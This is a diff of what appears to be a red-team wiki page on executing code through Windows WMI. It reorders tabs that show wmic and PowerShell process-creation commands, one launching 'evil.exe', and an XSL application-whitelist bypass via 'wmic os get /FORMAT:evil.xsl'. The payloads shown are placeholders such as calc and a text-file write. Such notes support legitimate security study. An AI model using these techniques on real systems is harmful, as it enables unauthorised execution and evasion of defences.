@@ -13,6 +13,28 @@ We can use WMI to execute binary, commands, msi, services, scheduled tasks or XS
 ## Practice
 
 {% tabs %}
+{% tab title="Commands" %}
+Execute a local binary or a command using wmic.exe
+
+```bash
+wmic.exe process call create "C:\Windows\Temp\evil.exe"
+wmic.exe process call create "cmd.exe /c calc.exe"
+```
+
+Or we may use powershell&#x20;
+
+```powershell
+#Execute a command remotely 
+$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
+
+#Powershell v1+
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $Command
+
+#Powershell v3+
+Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command }
+```
+{% endtab %}
+
 {% tab title="XSL" %}
 Another application whitelist bypassing technique discovered by Casey @subTee, similar to squiblydoo
 
@@ -37,28 +59,6 @@ Invoke wmic command and specify /format pointing to the evil.xsl:
 
 ```bash
 wmic os get /FORMAT:"evil.xsl"
-```
-{% endtab %}
-
-{% tab title="Commands" %}
-Execute a local binary or a command using wmic.exe
-
-```bash
-wmic.exe process call create "C:\Windows\Temp\evil.exe"
-wmic.exe process call create "cmd.exe /c calc.exe"
-```
-
-Or we may use powershell&#x20;
-
-```powershell
-#Execute a command remotely 
-$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
-
-#Powershell v1+
-Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $Command
-
-#Powershell v3+
-Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command }
 ```
 {% endtab %}
 
